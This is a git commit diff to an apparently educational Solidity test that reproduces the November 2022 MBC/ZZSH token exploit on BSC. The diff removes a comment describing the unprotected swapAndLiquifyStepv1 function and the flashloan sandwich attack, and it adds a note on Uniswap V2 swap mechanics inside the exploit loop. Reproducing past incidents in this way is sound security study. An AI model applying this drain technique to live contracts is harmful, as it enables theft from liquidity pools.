2a8fa25853df6f2692239857a14dbeb75098eb02
Joaquin L. Pereyra <joaquinlpereyra@gmail.com>
2022-12-02 16:32:31 -0300

    add: clarification about uniswap

--- test/Access_Control/MBCToken/MBCToken.attack.sol
+++ test/Access_Control/MBCToken/MBCToken.attack.sol
@@ -10,64 +10,6 @@ import {IWETH9} from "../../interfaces/IWETH9.sol";
 import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";
 
 
-// forge test --match-contract Exploit_MBCToken -vvv
-/*
-On Nov 29, 2022 an attacker stole ~$5k in USDT tokens from MoonBirds and ZZSH Liquidity Tokens.
-The attacker exploited the liquidity tokens contract by sandwich attacking a non access controlled liquify function.
-
-// Attack Overview
-Total Lost: ~5k USDT
-Attack Tx: https://bscscan.com/tx/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86
-Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86
-
-Exploited Contract - MBC: https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17
-Exploited Contract - ZZSH: https://bscscan.com/address/0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6
-
-Attacker Address: https://bscscan.com/address/0x9cc3270de4a3948449c1a73eabff5d0275f60785
-Attacker Contract: https://bscscan.com/address/0x0b13D2B0d8571C3e8689158F6DB1eedf6E9602d3
-Attack Block: 23474461 
-
-// Key Info Sources
-Twitter: https://twitter.com/AnciliaInc/status/1597742575623888896
-Code: https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17#code
-
-
-Principle: Non access controlled draining function, Sandwich Attack
-    
-    function swapAndLiquifyStepv1() public {
-        uint256 ethBalance = ETH.balanceOf(address(this));
-        uint256 tokenBalance = balanceOf(address(this));
-        addLiquidityUsdt(tokenBalance, ethBalance);
-    }
-
-    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
-        uniswapV2Router.addLiquidity(
-            address(_baseToken),
-			address(this),
-            usdtAmount,
-            tokenAmount,
-            0,
-            0,
-            _tokenOwner,
-            block.timestamp
-        );
-    }
-VULN
-0) The LiqToken contract holds stablecoin balance.
-The swapAndLiquifyStepv1:
-1) Reads the balance of the LiqToken contract accepting any pair price.
-2) Is not access controlled, meaning that anyone could call it manipulating both the LiqToken and the Pair balances.
-
-ATTACK:
-Essentially, a sandwich attack.
-1) Request a flashloan and manipulate the price of the UniswapV2 (Pancake pool).
-2) Call swapAndLiquifyStepv1() to drain the LiqToken contract forcing it to accept the manipulated price.
-3) Swap again for a discounted price (because the Pair has more liquidity after draining the LiqToken contract)
-
-MITIGATIONS:
-1) Evaluate if functions capable of draining a contract should be access controlled. 
-
-*/
 interface IDppOracle {
     function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data) external;
 }
@@ -123,10 +65,13 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
         console.log('===== STEP 3: START MANIPULATION =====');
         uint256 lenTokens = liqTokens.length;
         for(uint256 i = 0; i< lenTokens; i++){
-            // if(i == 1) continue;
             IUniswapV2Pair curPair = pairs[i];
             ILiqToken curLiqToken = liqTokens[i];
 
+            // Pay the Uniswap Pool.
+            // A note for those not-familiar, the swap in uniswap expects
+            // a transfer to it _before_ and does not use permit/allowance
+            // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/swaps
             usdt.transfer(address(curPair), 150000 ether);
 
             // For the first part, we drain MBC tokens
